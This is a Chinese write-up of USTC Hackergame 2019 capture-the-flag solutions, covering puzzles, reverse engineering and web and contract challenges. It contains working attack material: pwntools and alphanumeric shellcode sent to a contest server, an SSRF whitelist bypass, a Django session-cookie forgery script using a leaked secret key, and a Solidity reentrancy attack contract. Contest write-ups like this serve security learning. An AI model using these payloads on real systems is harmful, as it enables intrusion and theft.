# ustc-hackergame-2019
## 签到题
修改页面源码以及js代码，去掉disabled描述符，使用Fiddler替换，然后强制刷新页面
即可点击提交按钮得到flag
## 白与夜
图片是qq中常见的隐藏图，个人做这题时是用的手机
直接使用自带相册打开即可看到flag
## 信息安全 2077
注意到页面源码中设置了`If-Unmodified-Since`为当前时间，而返回的`Last-Modified`是`Fri, 01 Oct 2077 00:00:00 GMT`，把`If-Unmodified-Since`改为该值即可获得flag
## 宇宙终极问题
### 42
题目要求给出$x^3+y^3+z^3=42$的整数解，直接百度得到答案
```
（-80538738812075974）^3+80435758145817515^3+12602123297335631^3=42
```
输入即可得到flag
## 网页读取器
查看源代码，发现check_hostname时会把@之前的字符删掉
```python
def check_hostname(url):
    for i in whitelist_scheme:
        if url.startswith(i):
            url = url[len(i):]  # strip scheme
            url = url[url.find("@") + 1:]  # strip userinfo
            if not url.find("/") == -1:
                url = url[:url.find("/")]  # strip parts after authority
            if not url.find(":") == -1:
                url = url[:url.find(":")]  # strip port
            if url not in whitelist_hostname:
                return (False, "hostname {} not in whitelist".format(url))
            return (True, "ok")
    return (False, "scheme not in whitelist, only {} allowed".format(whitelist_scheme))

```
构造`http://web1/flag@example.com`提交，发现不对，于是加了个问号
即`http://web1/flag?@example.com`得到flag
## 达拉崩吧大冒险
查看页面源码可知，使用WebSocket进行数据传输，用户端只能发送数字作为当前选项
测试发现在料理大市场买鸡时，可以购买负数的鸡（通过控制台`ws.send(-1)发现`），猜测此处存在负数溢出漏洞。
完整流程代码:
```javascript
ws.send(0);ws.send(0);//进入["料理大市场","打怪升级","去恶龙洞穴"]选项
ws.send(0);ws.send(-3223372036854775807);//选择料理大市场并购买负数只鸡
ws.send(2);//进入恶龙洞穴
ws.send(0);//对话
ws.send(2);//得到flag
```
此处使用的负数是`MAX_INT64` (`9223372036854775807`)的最高位改成3，一次即可溢出成功，攻击变成了`2329883889435671600`
##  Happy LUG
??的Punycode编码是`xn--g28h`，故组合起来的域名为
`xn--g28h.hack.ustclug.org`
查询该域名的txt记录即可得到flag（手机端可使用`Network Tools`进行查询）
## 正则验证器
题目说需要找到运行时间超过一秒的正则表达式，查看源码发现还有长度限制
正则表达式长度不能大于6，匹配的文本长度不能大于24
个人直接百度找到了答案:
[如何中断一个长时间运行的“无限”Java正则表达式](http://ju.outofmemory.cn/entry/82230)
正则：`(0*)*A`，字符：`00000000000000000000000`
提交得到flag
## 小巧玲珑的 ELF
IDA打开，查看伪代码：
```c
 __asm
  {
    syscall; LINUX - sys_write
    syscall; LINUX - sys_read
  }
  for ( i = 0; i <= 45; ++i )
  {
    buf[i] += 2 * i;
    buf[i] ^= i;
    buf[i] -= i;
  }
  for ( j = 0; j <= 45; ++j )
  {
    if ( buf[j] != *(&v0 + j) )
      __asm { syscall; LINUX - sys_exit }
  }
  __asm
  {
    syscall; LINUX - sys_write
    syscall; LINUX - sys_exit
  }
}
```
其中v0到v45是数据段，需要dump出来（建议使用脚本）
这题有两种解法：爆破或者逆运算得出的flag
```python
data = [0x66,0x6e,0x65,0x6b,0x83,0x4e,0x6d,0x74,0x85,0x7a,0x6f,0x57,0x91,0x73,0x90,0x4f,0x8d,0x7f,0x63,0x36,0x6c,0x6e,0x87,0x69,0xa3,0x6f,0x58,0x73,0x66,0x56,0x93,0x9f,0x69,0x70,0x38,0x76,0x71,0x78,0x6f,0x63,0xc4,0x82,0x84,0xbe,0xbb,0xcd]
for i in range(46):
    x = data[i]
    x += i
    x ^= i
    x -= 2 * i
    print(chr(x),end="")

print("\nbrute")
for i in range(46):
    for x in range(256):
        tmp_x = x
        x += 2 * i
        x ^= i
        x -= i
        if(x==data[i]):
            print(chr(tmp_x),end = "")

```
## Shell三骇客
本题是`ShellCode`构造题，只要传入的`ShellCode`满足过滤条件就会被执行
### ShellHacker1
64位程序
没有任何过滤，使用`pwntools`生成`shellcode`，发送即可
```py
from pwn import *
context(log_level = 'debug', arch = 'amd64', os = 'linux')
shellcode=asm(shellcraft.sh())
#print(shellcode)
token = ""
#sh = process('chall1')

sh = remote('202.38.93.241',10000)
sh.recvuntil("Please input your token: ")
sh.sendline(token)

sh.send(shellcode)
sh.interactive()
```
### ShellHacker2
32位程序，逆向得知call地址为eax
限制输入为数字和大写字母
使用`msfvenom`对shellcode编码
得到
```py
shellcode="PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIRJSXCXVO6OVOCCBH6OE2BI2NRJTKV8MYM36QHILY8MK0AA"
```
发送即可getshell

### ShellHacker3
64位程序
限制输入为可打印字符
使用`[ALPHA3](https://github.com/SkyLined/alpha3)`对shellcode编码：
```
python2 ALPHA3.py x64 ascii mixedcase RAX --input=sc.bin
```
得到
```py
shellcode="Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C101k2m0h2r4y5p164y390U050C"
```
发送即可getshell

## 三教奇妙夜
解压出一个视频，使用脚本逐帧提取，把0x0为黑色（rgb为[0 0 0]）的图片提取出来
然后拼接图片中文字(字体为`Dejavu Sans Mono`)，即可得到flag

## 小 U 的加密
异或`0x39`得到一个midi文件(文件头`4D 54 68 64`)，使用`Audacity`打开得到flag
注：flag 中的字符串全部为英文小写字符。
## 献给最好的你
`com.hackergame.eternalEasterlyWind.data.LoginDataSource`类中的login方法
大致流程为：
对输入的密码进行base64编码，然后把该字符串大小写互转，与`pass1`:`AgfJA2vYz2fTztiWmtL3AxrOzNvUiq==`进行对比
一致则进入下一流程：
调用`logout`函数对`rawpassword`和一个自己数组进行运算，得到flag
所以对`pass1`进行大小写互转操作，得到`hackergame2019withfun!`
输入即可得到flag
（个人是把代码copy出来，直接调用`logout`函数输出的）

## 我想要个家
>此题考察的是对于 Linux 基础知识的掌握。尽管可以，但不建议使用逆向工程的方式完成。
### 一开始的尝试
首先建立一个文件夹，作为程序执行的根目录（以yourhome为例）
并保证只存在这四个目录`/Kitchen /Lavatory /Bedroom /Living_Room]`
然后运行
```
chroot /yourhome/ ./IWantAHome-linux
```
然后要求`/Bedroom/`下的`Microphone`和`Headset`的内容一致，考察链接的建立，执行语句：
```
ln Microphone Headset
```
然后要求`/Living_Room`中有一个记录当前时间(格式`20:15:30`)的`Clock`文件
写个脚本循环输出时间到该文件，另开终端运行，然后重新运行`IWantAHome-linux`
```
#!/bin/bash
while true
do
date "+%H:%M:%S" > /yourhome/Living_Room/Clock
done
```
然后要求输入`sleep 10 seconds in shell`的命令，输入`sleep 10`提示环境变量中找不到该可执行文件，可见并不是字符串判断
于是添加sleep到根目录，执行`./sleep 10`，提示找不到`/dev/null`，添加该文件后还是报错，提示`fork/exec ./sleep: no such file or directory`
各种尝试，最后还是选择逆向了
### 逆向做法
使用IDA64打开该文件，利用`IDAGolangHelper`脚本恢复函数名，找到`main_main`函数，修改执行流程，直接输出flag

## 被泄漏的姜戈
在`github`找到用户`openlug`创建的库:[https://github.com/openlug/django-common](https://github.com/openlug/django-common)
git clone下来，查看`app/views.py`:
```python
from django.contrib.auth import authenticate, login, logout
from django.contrib.auth.decorators import login_required
from django.shortcuts import render, redirect
from django.urls import reverse
from django.views.decorators.csrf import csrf_exempt

name = "Rabbit House 成员管理系统"


def index(request):
    if request.method == "GET":
        if request.user.is_authenticated:
            return redirect(reverse("profile"))
        return render(request, 'app/index.html', {
            "name": name
        })
    elif request.method == "POST":
        username = request.POST["username"]
        password = request.POST["password"]
        user = authenticate(request, username=username, password=password)
        if user is not None:
            login(request, user)
            return redirect(reverse("profile"))
        else:
            return redirect(reverse("index"))


@login_required
def profile(request):
    if request.user.username == "admin":
        user_profile = "flag redacted. login as admin on server to get flag."
    else:
        user_profile = "仅 admin 用户可阅览 flag。"
    return render(request, 'app/profile.html', {
        "name": name,
        "username": request.user,
        "profile": user_profile
    })


def log_out(request):
    logout(request)
    return redirect(reverse("index"))


from django.contrib.auth import models


def update_last_login(sender, user, **kwargs):
    pass


models.update_last_login = update_last_login
```
关键在于`if request.user.username == "admin":`判断，要让当前用户的用户名为`admin`，推测是Cookie欺骗
对Cookie进行解密（完整代码见后文）得到
```js
{'_auth_user_id': '2', '_auth_user_backend': 'django.contrib.auth.backends.ModelBackend', '_auth_user_hash': '0a884f8b987fca1a92c6f93d9042d83eea72d98d'}
```
查看Django源码得知，`_auth_user_backend`默认只有这一种，所以肯定是对`_auth_user_id`和`_auth_user_hash`进行替换
直接把`_auth_user_id`改为`1`，发现返回302跳转，所以应该还要得出admin的`_auth_user_hash`值

源码中有数据库文件`db.sqlite3`，查看发现其中有`pbkdf2_sha256`加密后的密码
`admin`: `pbkdf2_sha256$150000$KkiPe6beZ4MS$UWamIORhxnonmT4yAVnoUxScVzrqDTiE9YrrKFmX3hE=`
`guest`: `pbkdf2_sha256$150000$8GFvEvr58uL6$YWM8Fqu8t/UYcW4iHqxXpkKPMEzlUvxbeHYJI45qBHM=`
找到生成`_auth_user_hash`的代码(`django.contrib.auth.bast_user.py`)
```python
    def get_session_auth_hash(self):
        """
        Return an HMAC of the password field.
        """
        key_salt = "django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash"
        return salted_hmac(key_salt, self.password).hexdigest()
```
copy出来，利用加密后的密码生成哈希值
```python
password = "pbkdf2_sha256$150000$KkiPe6beZ4MS$UWamIORhxnonmT4yAVnoUxScVzrqDTiE9YrrKFmX3hE="
hash1 = salted_hmac("django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash", password).hexdigest()
print(hash1)
```
得到`0a884f8b987fca1a92c6f93d9042d83eea72d98d`，恰好是解密出的`_auth_user_hash`值，验证算法成功
然后修改`_auth_user_id`和`_auth_user_hash`，加密生成Cookie，requests.get即可
完整脚本（放置在`openlug/`下）：
```python
import sys,os,json,requests,re
os.environ.setdefault('DJANGO_SETTINGS_MODULE','settings')
from django.core import signing
from django.contrib.sessions.backends import signed_cookies
from django.utils.crypto import salted_hmac

# key=None : SECRET_KEY
def decode(s):
    return signing.loads(sess,key=None,salt = "django.contrib.sessions.backends.signed_cookies",max_age=1209600)

def encode(s):
    return signing.dumps(sess,key=None,salt = "django.contrib.sessions.backends.signed_cookies",compress = True)

def requestByCk(ck):
    mcookie = {"sessionid":ck}
    r = requests.get("http://202.38.93.241:10019/profile",cookies = mcookie,allow_redirects=False)
    if(r.status_code == 200):
        rawstr = (r.text)
        username = re.findall(r"欢迎您，(.....)！", rawstr)
        if(username[0] == 'admin'):
            flag = re.findall(r"flag{.*}", rawstr)
            print(flag[0])
    elif(r.status_code == 302):
        print("Wrong Cookie.")
    else:
        print("Error:"+r.status_code) 


sess = ".eJxVjDEOgzAMRe_iGUUQULE7du8ZIid2GtoqkQhMVe8OSAzt-t97_wOO1yW5tersJoErWGh-N8_hpfkA8uT8KCaUvMyTN4diTlrNvYi-b6f7d5C4pr1uGXGI6AnHGLhjsuESqRdqByvYq_JohVDguwH3fzGM:1iKXmf:PfphreMrpv-FPLjjGGKUkcFgc2Q"
sess = decode(sess)
print("decode:")
print(sess)

password = "pbkdf2_sha256$150000$KkiPe6beZ4MS$UWamIORhxnonmT4yAVnoUxScVzrqDTiE9YrrKFmX3hE="
adminHash = salted_hmac("django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash", password).hexdigest()
print(adminHash)

sess["_auth_user_id"] = "1"
sess["_auth_user_hash"] = adminHash
print("changed:")
print(sess)
sess = encode(sess)
print("encode:")
print(sess)
requestByCk(sess)
```

## PowerShell 迷宫
连接上服务器，cd到根目录，find查找`PSMaze.dll`，发现在`opt`文件夹中
使用`base64`命令输出，拿到程序二进制进行分析
发现在`MazeProvider.GetCellRepr`函数中会对当前节点进行判断，如果是终点则进行sha256计算，计算flag
通过BFS或Dijkstra算法得到迷宫起点到终点的最短路径，然后cd到该目录获得flag
写个powershell脚本遍历即可（使用Where-Object进行过滤，不走重复路线）
脚本：
```
Import-Module ./PSMaze.dll

function print_i($i) {
    if($i.X -eq 63){
        if($i.Y -eq 63){
        write-host $i.PSPath -fore green
        write-host $i.Flag -fore red
    }
    }
}

function foreachPath($startFolder, $passDir) {
    $colItems = Get-ChildItem $startFolder | Where-Object { $_.Direction -ne $passDir } | Sort-Object
    foreach ($i in $colItems) {
        print_i $i
        $passDir = getInv $i.PSPath
        foreachPath $i.PSPath $passDir
        }
}

function getInv($path) {
    $direction = split-path $path -Leaf
    if ($direction -eq "Up") {
        return "Down"
    }
    if ($direction -eq "Down") {
        return  "Up"
    }
    if ($direction -eq "Left") {
        return "Right"
    }
    if ($direction -eq "Right") {
        return "Left"
    }
}

foreachPath "Maze:/" "Up"

```

输出：
```
PSMaze\Maze::\Down\Right\Down\Right\Down\Right\Down\Down\Down\Right\Down\Right\Down\Right\Right\Down\Right\Down\Right\Down\Left\Down\Left\Left\Left\Left\Left\Down\Down\Right\Down\Left\Left\Down\Left\Down\Down\Down\Down\Down\Down\Down\Right\Down\Left\Down\Right\Right\Down\Down\Left\Down\Left\Down\Down\Down\Right\Up\Right\Down\Right\Down\Right\Up\Right\Right\Up\Up\Right\Up\Up\Right\Up\Right\Up\Up\Right\Up\Right\Up\Up\Right\Down\Down\Right\Down\Down\Down\Down\Down\Right\Right\Down\Down\Down\Down\Right\Right\Down\Left\Down\Down\Left\Down\Down\Down\Left\Down\Down\Down\Down\Down\Left\Left\Down\Left\Down\Left\Down\Left\Down\Left\Down\Down\Left\Left\Left\Down\Down\Down\Right\Down\Down\Right\Up\Right\Down\Right\Right\Right\Down\Right\Down\Down\Right\Up\Right\Down\Right\Up\Right\Right\Down\Down\Right\Down\Right\Down\Down\Right\Right\Right\Up\Right\Right\Right\Up\Right\Right\Right\Right\Up\Left\Up\Up\Up\Up\Right\Right\Right\Up\Right\Right\Right\Right\Right\Down\Down\Down\Left\Down\Right\Down\Right\Right\Up\Up\Right\Right\Down\Down\Right\Up\Right\Up\Right\Up\Right\Right\Down\Down\Right\Right\Right\Right\Up\Left\Up\Right\Right\Down\Right\Right\Right\Right\Down\Down\Down\Down\Right\Down\Right\Right\Up\Right\Right\Right\Down\Left\Down\Right\Right\Down\Right
flag{D0_y0u_1ik3_PSC0r3_n0w_2C6BE488}
```
## 韭菜银行
### flag1
执行
```js
web3.eth.getStorageAt("0xE575c9abD35Fa94F1949f7d559056bB66FddEB51",2,console.log)
```
获取到secert的值，提交即可得到flag
### flag2
`withdraw`函数存在重入和溢出漏洞，构造攻击合约，使余额为一个大数
然后使用攻击合约调用`get_flag_2`，即可设置got_flag字段的值，从而获得flag
攻击合约:
```js
pragma solidity ^0.4.26;

contract JCBank {
    mapping (address => uint) public balance;
    mapping (uint => bool) public got_flag;
    uint128 secret;

    constructor (uint128 init_secret) public {
        secret = init_secret;
    }

    function deposit() public payable {
        balance[msg.sender] += msg.value;
    }

    function withdraw(uint amount) public {
        require(balance[msg.sender] >= amount);
        msg.sender.call.value(amount)();
        balance[msg.sender] -= amount;
    }

    function get_flag_1(uint128 guess) public view returns(string) {
        require(guess == secret);

        bytes memory h = new bytes(32);
        for (uint i = 0; i < 32; i++) {
            uint b = (secret >> (4 * i)) & 0xF;
            if (b < 10) {
                h[31 - i] = byte(b + 48);
            } else {
                h[31 - i] = byte(b + 87);
            }
        }
        return string(abi.encodePacked("flag{", h, "}"));
    }

    function get_flag_2(uint user_id) public {
        require(balance[msg.sender] > 1000000000000 ether);
        got_flag[user_id] = true;
        balance[msg.sender] = 0;
    }
}

contract Battach{
    address target;
    address owner;
    uint256 money;
    JCBank g;
    uint flag = 0;
    
    modifier ownerOnly {
        require(owner == msg.sender);
        _;
    }
    // 构造函数初始化合约所有者的地址
    constructor() payable public{
        target = 0xE575c9abD35Fa94F1949f7d559056bB66FddEB51;
         g = JCBank(target);
        owner = msg.sender;
        money = 1;
    }
 
    function getFlag(uint _user_id) ownerOnly payable{
     g.get_flag_2(_user_id);
    }
   
    //开始攻击合约
    function startattach() ownerOnly payable{
        require(msg.value >= 1);
       flag = 0;
       g.deposit.value(money)();
       g.withdraw(money);
    }
    
    
    // 销毁合约，相当于C++里的析构
    function stopattach() ownerOnly{
        selfdestruct(owner);
    }
    
    //fallback 函数
    function() payable{
        require(flag == 0);
        flag = 1;
        g.withdraw(money);
    }
 
}
```
## 没有 BUG 的教务系统
### 第一题
定位到判断代码
```cpp
    for (i = 0; i <= 7; ++i)
        temp_password[i] = ((temp_password[i] | temp_password[i + 1]) & ~(temp_password[i] & temp_password[i + 1]) | i) & ~((temp_password[i] | temp_password[i + 1]) & ~(temp_password[i] & temp_password[i + 1]) & i);
    if(memcmp(temp_password, "\x44\x00\x02\x41\x43\x47\x10\x63\x00", 9)) {
        cout << "Bad guy! Wrong password!" << endl;
        exit(0);
    }
```
会对当前位和下一位进行运算，但是循环并没有操作最后一个字符00，所以从后往前逆推即可得到第一个flag

## 比赛时间内未完成的题
个人尝试见[我的博客](XhyEax.github.io)

好几题都是差一步得出flag，还是太菜了 = =